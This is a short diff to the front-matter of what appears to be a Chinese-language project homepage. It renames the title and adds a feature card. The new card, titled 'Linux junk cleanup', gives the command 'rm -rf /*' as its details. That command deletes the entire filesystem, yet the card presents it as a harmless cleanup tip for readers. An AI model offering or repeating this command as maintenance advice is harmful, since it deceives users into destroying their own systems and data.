@@ -1,6 +1,6 @@
 ---
 home: true
-title: Home
+title: 主页
 heroImage: https://img2.imgtp.com/2024/05/04/DyAwgkkH.jpg
 actions:
   - text: 现在开始
@@ -22,6 +22,8 @@ features:
     details: nude app start
   - title: 云崽一键安装
     details: apt install Yunzai
+  - title: Linux清理垃圾
+    details: rm -rf /*
 
 footer: MIT Licensed | Copyright © 2024-present LiuYunLingNai
 ---
